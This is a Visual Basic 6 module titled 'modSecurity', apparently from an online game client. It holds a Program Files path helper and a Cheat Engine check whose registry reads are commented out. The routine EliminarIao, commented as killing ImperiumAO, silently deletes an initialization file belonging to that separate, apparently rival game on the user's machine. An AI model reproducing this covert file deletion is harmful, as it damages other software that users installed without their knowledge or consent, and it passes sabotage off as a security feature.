Attribute VB_Name = "modSecurity"
Option Explicit

Private Declare Function SHGetSpecialFolderLocation Lib "shell32" (ByVal hWndOwner As Long, _
    ByVal nFolder As Long, _
    pidl As ItemIDLIST) As Long

Private Declare Function SHGetPathFromIDList Lib "shell32" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, _
    ByVal pszPath As String) As Long

Private Type EMID
    cb As Long
    abID As Byte
End Type

Private Type ItemIDLIST
    mkid As EMID
End Type

Public Sub BuscarEngine()

On Error Resume Next
    
    Dim Ob As Object
    Dim reg As String
    Dim reg2 As String
    
    Set Ob = CreateObject("Wscript.Shell")
    
    'reg = Ob.RegRead("HKEY_CURRENT_USER\Software\Cheat Engine\First Time User")
    
    'reg2 = Ob.RegRead("HKEY_USERS\S-1-5-21-343818398-484763869-854245398-500\Software\Cheat Engine\First Time User")
    
    If LenB(reg) > 0 Or LenB(reg2) > 0 Then
        MsgBox "Debes desinstalar Cheat Engine para poder jugar."
        End
    End If
    
    Set Ob = Nothing
End Sub

Public Sub EliminarIao()

    'Mata a ImperiumAO :D
    Dim IaoPath As String
    
    IaoPath = GetProgramFilesFolder & "\ImperiumAO 1.4.5\Recursos\Init.iao"

    If FileExist(IaoPath, vbArchive) Then
       Call Kill(IaoPath)
    End If

End Sub

Public Function GetProgramFilesFolder() As String

    Dim strPath As String

    Dim strTemp As String

    Dim IDL As ItemIDLIST

    Dim lRet As Long


    'Get the special folder
    
    lRet = SHGetSpecialFolderLocation(100, &H2A, IDL)

    If lRet = 0 Then

        strPath = Space$(512)       'Create a buffer

        'Get the path from the IDList

        lRet = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal strPath)

        'Remove the unnecessary chr$(0)'s

        strTemp = Left$(strPath, InStr(strPath, Chr$(0)) - 1)

        strTemp = IIf(Right$(strTemp, 1) = "\", strTemp, strTemp & "\")

        GetProgramFilesFolder = strTemp

    Else

        GetProgramFilesFolder = vbNullString

    End If

End Function

